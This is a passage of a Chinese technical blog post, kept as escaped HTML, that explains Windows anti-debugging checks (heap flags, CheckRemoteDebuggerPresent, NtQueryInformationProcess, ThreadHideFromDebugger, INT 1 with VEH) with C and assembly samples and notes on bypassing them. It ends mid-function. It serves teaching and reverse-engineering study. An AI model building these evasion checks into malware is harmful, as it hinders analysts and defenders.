&lt;span class="n">PDWORD&lt;/span> &lt;span class="n">heapFlags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PDWORD&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="n">PBYTE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">heap&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x40&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">PDWORD&lt;/span> &lt;span class="n">forceFlags&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">PDWORD&lt;/span>&lt;span class="p">)((&lt;/span>&lt;span class="n">PBYTE&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">heap&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x44&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">heapFlags&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="o">~&lt;/span>&lt;span class="n">HEAP_GROWABLE&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">forceFlags&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;PEB-&amp;gt;_HEAP-&amp;gt;HeapFlags,ForceFlags&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码本身很简单，不多解释。在调试器启动时会触发反调试代码，正常运行则不会。这个检查比较粗陋，可以根据上面 CTF Wiki 摘录内容的说法，根据 PE 头中的 subsystem 来二次判断，来发现尝试 bypass 反调试代码的行为。&lt;/p>
&lt;p>至于如何 bypass 这个反调试方案，按上面给出的原理来反向应用就好了。&lt;/p>
&lt;h3 id="24-checkremotedebuggerpresent">2.4 CheckRemoteDebuggerPresent&lt;/h3>
&lt;p>&lt;code>CheckRemoteDebuggerPresent&lt;/code> 的&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent" target="_blank" rel="noopener"
>微软文档&lt;/a>中这么描述：确定指定进程是否正在被调试。接受两个参数，一个是进程的 HANDLE，一个是 PBOOL。&lt;/p>
&lt;p>应用方式可以有很多，可以在进程内自己检查自己有没有被调试；或者开新进程去监视原进程是否正在被调试；甚至注入正常进程，隐藏好自己，再去监视原进程是否被调试；甚至干脆潜伏下来开个后门，亲自人肉监视屏幕上有没有调试器&amp;hellip;&amp;hellip;越说越离谱了。&lt;/p>
&lt;p>总之先给了案例。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_CheckRemoteDebuggerPresent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">BOOL&lt;/span> &lt;span class="n">isRemoteDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">CheckRemoteDebuggerPresent&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">isRemoteDebuggerPresent&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">isRemoteDebuggerPresent&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">TRUE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;CheckRemoteDebuggerPresent&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>代码很简单不多解释，不过从这里可以引出新的内容：&lt;code>CheckRemoteDebuggerPresent&lt;/code> 的实现方式是调用 &lt;code>NtQueryInformationProcess&lt;/code> ，一个没有文档的内核接口。&lt;/p>
&lt;h3 id="25-ntqueryinformationprocess">2.5 NtQueryInformationProcess&lt;/h3>
&lt;p>&lt;code>NtQueryInformationProcess&lt;/code> 同样没文档，这里给出比较清晰的 &lt;a class="link" href="https://ctf-wiki.org/reverse/windows/anti-debug/ntqueryinformationprocess/" target="_blank" rel="noopener"
>CTF Wiki&lt;/a> 的说明链接。&lt;code>NtQueryInformationProcess&lt;/code> 是一个查询信息的接口，输入参数包括查询的信息类型、进程HANDLE、结果指针等。用法同样是简单的。&lt;/p>
&lt;p>值得关注的查询信息类型包括：&lt;/p>
&lt;ul>
&lt;li>&lt;code>ProcessDebugPort&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessBasicInformation&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessDebugObjectHandle&lt;/code>&lt;/li>
&lt;li>&lt;code>ProcessDebugFlags&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>对于 &lt;code>ProcessDebugPort&lt;/code>，查询结果是一个 DWORD，当存在调试器时查询结果会是 &lt;code>0xffffffff&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_NtQueryInformationProcess&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">ntdll&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibrary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ntdll.dll&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">FARPROC&lt;/span> &lt;span class="n">ntQueryInfoProc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;NtQueryInformationProcess&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntQueryInfoProc&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">DWORD&lt;/span> &lt;span class="n">isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">NTSTATUS&lt;/span> &lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ntQueryInfoProc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ProcessDebugPort&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">isDebuggerPresent&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DWORD&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="n">isDebuggerPresent&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;NtQueryInformationProcess&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于 &lt;code>ProcessBasicInformation&lt;/code>，查询结果是 &lt;code>PROCESS_BASIC_INFORMATION&lt;/code> 结构，可以根据这个结构来进一步判断父进程是否是已知的调试器。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="cp">#ifdef UNICODE
&lt;/span>&lt;span class="cp"># define MY_STRCMP wcscmp
&lt;/span>&lt;span class="cp">#else
&lt;/span>&lt;span class="cp"># define MY_STRCMP strcmp
&lt;/span>&lt;span class="cp">#endif
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_NtQueryInformationProcess_BasicInformation&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">ntdll&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibrary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ntdll.dll&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">FARPROC&lt;/span> &lt;span class="n">ntQueryInfoProc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;NtQueryInformationProcess&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntQueryInfoProc&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">PROCESS_BASIC_INFORMATION&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">NTSTATUS&lt;/span> &lt;span class="n">status&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ntQueryInfoProc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ProcessBasicInformation&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">HANDLE&lt;/span> &lt;span class="n">hProcSnap&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">CreateToolhelp32Snapshot&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TH32CS_SNAPPROCESS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">hProcSnap&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">PROCESSENTRY32&lt;/span> &lt;span class="n">pe32&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">dwSize&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">PROCESSENTRY32&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">Process32First&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcSnap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pe32&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">do&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">th32ProcessID&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">InheritedFromUniqueProcessId&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">MY_STRCMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;devenv.exe&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">szExeFile&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">MY_STRCMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;x32dbg.exe&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">szExeFile&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span>
&lt;span class="n">MY_STRCMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;x64dbg.exe&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">szExeFile&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="n">MY_STRCMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ollydbg.exe&amp;#34;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">pe32&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">szExeFile&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;BasicInformation&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">CloseHandle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcSnap&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">return&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Process32Next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hProcSnap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">pe32&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ProcessObjectDebugHandle&lt;/code> 和 &lt;code>ProcessDebugFlags&lt;/code> 就不一一给案例了。检查方式也很简单，就是判断非零则存在调试器。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">ntQueryInfoProc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ProcessObjectDebugHandle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">handle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">HANDLE&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">ntQueryInfoProc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentProcess&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ProcessDebugFlags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ULONG&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为 &lt;code>NtQueryInformationProcess&lt;/code> 是从内核查询消息，所以 bypass 会比较难——就是说需要 HOOK 。但我还不会 HOOK ，所以略过。&lt;/p>
&lt;h3 id="26-ntsetinformationthread">2.6 NtSetInformationThread&lt;/h3>
&lt;p>又是一个没有文档的API。&lt;code>NtSetInformationThread&lt;/code> 等同于 &lt;code>ZwSetInformationThread&lt;/code>，通过设置 &lt;code>ThreadHideFromDebugger&lt;/code> 标志位可以禁止线程产生调试事件。如果正处于调试状态执行了这个 API 则会导致程序立即退出。&lt;/p>
&lt;p>案例如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="k">typedef&lt;/span> &lt;span class="nf">NTSTATUS&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">NTAPI&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">pfnNtSetInformationThread&lt;/span>&lt;span class="p">)(&lt;/span>&lt;span class="n">_In_&lt;/span> &lt;span class="n">HANDLE&lt;/span> &lt;span class="n">ThreadHandle&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_In_&lt;/span> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">ThreadInformationClass&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">_In_&lt;/span> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">ThreadInformation&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_In_&lt;/span> &lt;span class="n">ULONG&lt;/span> &lt;span class="n">ThreadInformationLength&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_HideFromDebugger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">HMODULE&lt;/span> &lt;span class="n">ntdll&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">LoadLibrary&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ntdll.dll&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">pfnNtSetInformationThread&lt;/span> &lt;span class="n">ntSetInfoThread&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pfnNtSetInformationThread&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">GetProcAddress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ntdll&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;NtSetInformationThread&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ntSetInfoThread&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">abort&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">ntSetInfoThread&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetCurrentThread&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="n">ThreadHideFromDebugger&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// ... NtCreateThreadEx THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>同样因为这一方式是走内核接口，可以通过 HOOK 技术把相应的标志位拦截掉就行。&lt;/p>
&lt;h3 id="27-setgetlasterror">2.7 Set/GetLastError&lt;/h3>
&lt;p>对&lt;code>SetLastError&lt;/code>和&lt;code>GetLastError&lt;/code>的利用方式是结合 &lt;code>OutputDebugString&lt;/code> 失败时会修改 &lt;code>GetLastError()&lt;/code> 的错误码的行为，判断是否有调试器存在。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="c1">// TODO: somehow not work on windows 10, need more test.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kt">void&lt;/span> &lt;span class="nf">anti_debug_by_SetLastError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">SetLastError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x1234&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="n">OutputDebugString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">TEXT&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hello Debugger!&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">GetLastError&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">MessageBoxA&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">NULL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;debugger detected&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;Set/Get LastError&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">MB_OK&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>比较奇怪的是在我这无论在不在调试环境跑都会触发反调试，环境 Windows 10 + MinGW 。&lt;/p>
&lt;h2 id="0x03-异常处理方式">0x03 异常处理方式&lt;/h2>
&lt;p>异常处理方式的反调试，是通过触发会被调试器处理的中断或者异常，如果调试器拦截并处理了中断或异常，就会导致程序里注册的异常处理函数未被执行，进而发现正在被调试。&lt;/p>
&lt;p>这个思路也可以用来构造特殊的控制流，比如把关键逻辑放在中断处理函数里，然后抛出 INT 1 中断（单步执行），如果被调试器命中，则我们构造的控制流就会被破坏，程序就会跑飞。&lt;/p>
&lt;h3 id="31-int-1">3.1 INT 1&lt;/h3>
&lt;p>INT 1 中断的含义是 SINGLE STEP，在调试器上的表现就是会让调试器断在中断的位置（反正在x32dbg上的表现是这样）。INT 1中断后，如果没有调试器，那么控制权会转交给调试器，SEH 不会执行，反之则 SEH 执行，用户程序保留控制权。&lt;/p>
&lt;p>实际上发现 x32dbg 即使断到了也会把控制权转给 SEH，所以对关于 SEH 反调试是否可行、如何实现持疑问。但是经过一番搜索和研究发现 VEH 机制可以实现上述逻辑。案例代码如下。&lt;/p>
&lt;p>用来抛出 INT 1 中断的汇编代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-asm" data-lang="asm">&lt;span class="nf">section&lt;/span> &lt;span class="no">.text&lt;/span>
&lt;span class="nf">global&lt;/span> &lt;span class="no">_RaiseInt1&lt;/span>
&lt;span class="nl">_RaiseInt1:&lt;/span>
&lt;span class="nf">pushfd&lt;/span>
&lt;span class="nf">or&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">esp&lt;/span>&lt;span class="p">],&lt;/span>&lt;span class="no">dword&lt;/span> &lt;span class="mi">0x100&lt;/span>
&lt;span class="nf">popfd&lt;/span>
&lt;span class="nf">retn&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>检测调试器的函数如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="n">BOOL&lt;/span> &lt;span class="k">volatile&lt;/span> &lt;span class="n">VEH_INT1_isDebuggerPresent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">FALSE&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">LONG&lt;/span> &lt;span class="n">CALLBACK&lt;/span> &lt;span class="nf">VEH_INT1_UnhandledExceptionFilter&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_In_&lt;/span> &lt;span class="n">EXCEPTION_POINTERS&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">lpEP&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
